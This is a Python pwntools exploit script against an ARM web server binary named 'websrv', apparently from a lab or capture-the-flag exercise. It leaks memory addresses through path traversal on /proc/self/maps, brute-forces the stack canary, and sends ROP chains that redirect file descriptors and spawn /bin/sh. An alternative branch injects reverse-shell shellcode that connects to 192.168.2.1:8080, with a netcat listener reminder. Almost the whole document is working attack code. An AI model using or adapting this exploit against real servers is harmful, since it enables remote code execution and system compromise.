from pwn import *


context.clear(kernel="arm", arch="arm", bits=32, endian='little')

# exe_base = 0
# libc_base = 0

def is_alive(p):
	try:
		p.send(b"GET /index.html " + b"A"*40 + b"\nContent-lth: 10\r\n\r\n")
	except:
		# p.close()
		return False
	# p.send(cyclic(10))
	# print("Sended 2")
	data = p.recvrepeat(0.1)
	# print(data)
	return b"" != data


def crash(p):
	# data should be: 0x1008 + R4-R11 = 0x1028 (+ LR)
	# stack cookie at data+0x1000
	p.send(b"GET /test " + b"A"*41 + b"\nContent-Length: 1024\r\n\r\n")
	p.send(cyclic(1024))
	print("Sended 1")
	print(p.recvrepeat(timeout=1))

	p.send(b"GET /test " + b"A"*40 + b"\nContent-length: 10\r\n\r\n")
	p.send(cyclic(10))
	print("Sended 2")
	print(p.recvrepeat(timeout=1))


def get_info(p):
	p.send(b"GET /../../proc/self/maps HTTP/1.1\nContent-length: 10\r\n\r\n")
	p.send(b"A"*10)
	p.recvuntil(b"\r\n\r\n")
	libc_base = exe_base = stack_base = 0
	while libc_base == 0 or exe_base == 0 or stack_base == 0:
		line = p.recvline()
		if libc_base == 0 and b"libc" in line:
			libc_base = int(line.split(b"-")[0], base=16)
		elif exe_base == 0 and b"websrv" in line:
			exe_base = int(line.split(b"-")[0], base=16)
		elif stack_base == 0 and b"[stack]" in line:
			stack_base = int(line.split(b"-")[0], base=16)

	print(f"Exe base: {exe_base:#x}, Libc base: {libc_base:#x}")
	print("Receive --")
	print(p.recvrepeat(timeout=1))
	print("End receive --")
	return exe_base, libc_base, stack_base

def brute_cookies():
	before_canary = 0x1000
	header = "GET /inde HTTP\r\nContent-length: {}\r\n" + "A"*3900 + "\r\n\r\n"
	header_len = len(header)
	assume_length = before_canary-len(header)+2-3
	assert(assume_length<1000 and assume_length>100)

	canary = b"\x00"

	for k in range(3):
		cur_ch = 0
		p = remote("192.168.2.2", 80)
		p.send(header.format(assume_length+2+k).encode())
		p.send(b"A"*assume_length+canary+int.to_bytes(cur_ch, 1, "little"))
		p.recvrepeat(timeout=0.1)
		cur_ch += 1
		while cur_ch < 255 and not is_alive(p):
			p.close()
			p = remote("192.168.2.2", 80)
			# print(header.format(assume_length+2+k).encode())
			p.send(header.format(assume_length+2+k).encode())
			p.send(b"A"*assume_length+canary+int.to_bytes(cur_ch, 1, "little"))
			p.recvrepeat(timeout=0.1)
			cur_ch += 1
		p.close()
		canary += int.to_bytes(cur_ch-1, 1, "little")
		print(f"Now canary is: {canary}")
		# assume_length += 1
	print(f"Found canary: {canary}")

	# Now test canary
	print("Now test result")
	p = remote("192.168.2.2", 80)
	p.send(header.format(assume_length).encode())
	p.send(b"A"*assume_length)
	print(p.recvrepeat(timeout=0.1))
	p.close()

	p = remote("192.168.2.2", 80)
	p.send(header.format(assume_length+1).encode())
	p.send(b"A"*assume_length+canary[:1])
	print(p.recvrepeat(timeout=0.1))
	p.close()

	p = remote("192.168.2.2", 80)
	p.send(header.format(assume_length+2).encode())
	p.send(b"A"*assume_length+canary[:2])
	print(p.recvrepeat(timeout=0.1))
	p.close()

	p = remote("192.168.2.2", 80)
	p.send(header.format(assume_length+3).encode())
	p.send(b"A"*assume_length+canary[:3])
	print(p.recvrepeat(timeout=0.1))
	p.close()
	return canary

# def get_cmdline(p, i):
# 	p.send(b"GET /../../proc/" + str(i).encode() + b"/cmdline HTTP/1.1\nContent-length: 10\r\n\r\n")
# 	p.send(b"A"*10)
# 	if b"Not Found" in p.recvuntil(b"\r\n\r\n"):
# 		p.close()
# 		return
# 	print(p.recvrepeat(timeout=0.1).decode())
# 	print("End receive --")


def p(*args):
	res = b""
	for elem in args:
		res += p32(elem)
	return res

def rop_call(exe_base, func_addr, *args):
	set_args_0 = 0x00001ad8+exe_base 	# pop {r3, r4, r5, r6, r7, r8, sl, pc};
	set_args_1 = 0x00001abc+exe_base 	# mov r0, r6; mov r1, r7; mov r2, r8; add r4, r4, #1; blx r3;
	"""
	    ╎   0x00001abc      0600a0e1       mov r0, r6                                                                                                                                         
│       ╎   0x00001ac0      0710a0e1       mov r1, r7                                                                                                                                         
│       ╎   0x00001ac4      0820a0e1       mov r2, r8                                                                                                                                         
│       ╎   0x00001ac8      014084e2       add r4, r4, 1                                                                                                                                      
│       ╎   0x00001acc      33ff2fe1       blx r3                                                                                                                                             
│       ╎   0x00001ad0      0a0054e1       cmp r4, sl                                                                                                                                         
│       └─< 0x00001ad4      f7ffff1a       bne 0x1ab8                                                                                                                                         
└           0x00001ad8      f885bde8       pop {r3, r4, r5, r6, r7, r8, sl, pc} 
	"""
	assert(len(args) <= 3)
	# Registers args lies in r0-r3
	dummy = 0x41414141
	args = list(args)
	stack_args = args[4:]
	registers_args = args+[dummy]*(3-len(args)) if len(args) <= 3 else args[:3]
	print(registers_args)
	# To call function
	gadget = p(set_args_0) + p(func_addr) + p(dummy) + p(dummy) + p(*registers_args) + p(dummy+1) + p(set_args_1)
	# To exit after function
	gadget += p(dummy)*7 #Yep, uneffective but simple
	return gadget

def asm_dup2(dup2_addr, oldfd):
	return "mov r0, r6; mov r1, " + str(oldfd) + "; " + shellcraft.arm.setregs({"r3": dup2_addr}) + "; blx r3;"

def gen_mprotect_gadget(exe_base, libc_base, stack_base, e, libc):
	mprotect_addr = libc.symbols["mprotect"]+libc_base
	dup2_addr = libc.symbols["dup2"]+libc_base
	system_addr = libc.symbols["system"]+libc_base

	binsh_addr = 0x00116974+libc_base
	stack_addr = 0x20ba0-4+stack_base			# before poping first ret (point to the gadget)
	mprot_start = util.misc.align_down(0x1000, stack_addr)
	nop = b"\x00\x00\xa0\xe1"	# mov r0, r0

	gadget = rop_call(exe_base, mprotect_addr, mprot_start, 0x1000, 7)
	gadget += p32(stack_addr+len(gadget)+2*len(nop)) + 5*nop
	gadget += asm(shellcraft.arm.linux.connect("192.168.2.1", 8080)) # Store connection in r6
	gadget += asm(asm_dup2(dup2_addr, 0) + asm_dup2(dup2_addr, 1) + asm_dup2(dup2_addr, 2))
	gadget += asm(shellcraft.arm.setregs({"r0": binsh_addr, "r3": system_addr}) + "; blx r3")

	return gadget


def gen_system_gadget(exe_base, libc_base, e, libc):
	system_plt = e.plt["system"]+exe_base
	exit_plt = e.plt["exit"]+exe_base
	dup_addr = libc.symbols["dup2"]+libc_base
	set_r0 = 0x0000115c+exe_base 		# mov r0, r6; pop {r4, r5, r6, pc};
	
	call_func = 0x00000fb8+exe_base		# blx r3; pop {r3, pc}; 
	binsh_addr = 0x00116974+libc_base

	# gadget = p32(set_r0) + b"A"*12 + p32(system_plt)
	gadget = rop_call(exe_base, dup_addr, 4, 0) + rop_call(exe_base, dup_addr, 4, 1) + rop_call(exe_base, dup_addr, 4, 2) + rop_call(exe_base, system_plt, binsh_addr)

	return gadget


def send_gadget(canary, exe_base, libc_base, stack_base, e, libc):
	p = remote("192.168.2.2", 80)
	before_canary = 0x1000
	header = "GET /inde HTTP\r\nContent-length: {}\r\n" + "A"*3900 + "\r\n\r\n"
	
	if (False):
		print("Dont forget to run `nc -lvp 8080`")
		input()
		gadget = gen_mprotect_gadget(exe_base, libc_base, stack_base, e, libc)
	else:
		gadget = gen_system_gadget(exe_base, libc_base, e, libc)

	dummy_len = before_canary-len(header)+2-3 
	assume_length = dummy_len + 8 + 0x20 + len(gadget)
	assert(assume_length<1000 and assume_length>100)

	p.send(header.format(assume_length).encode())
	p.send(b"A"*dummy_len+canary+b"A"*0x10+b"A"*0x14+gadget)
	p.interactive()
	# print(p.recvrepeat(timeout=0.1))

def main():
	e = ELF("./bin/websrv")
	libc = ELF("./bin/libc.so.6")
	canary = brute_cookies()
	p = remote("192.168.2.2", 80)
	# is_alive(p)
	exe_base, libc_base, stack_base = get_info(p)
	# print(f"{exe_base:#x} {libc_base:#x}")
	p.close()

	# Exe base: 0x76f17000, Libc base: 0x76dc7000
	# exe_base = 0x76f17000
	# libc_base = 0x76dc7000
	# stack_base = 0x7ebd8000
	
	# canary = b'\x00)\xc2!'
	send_gadget(canary, exe_base, libc_base, stack_base, e, libc)
	# brute_cookies()


main()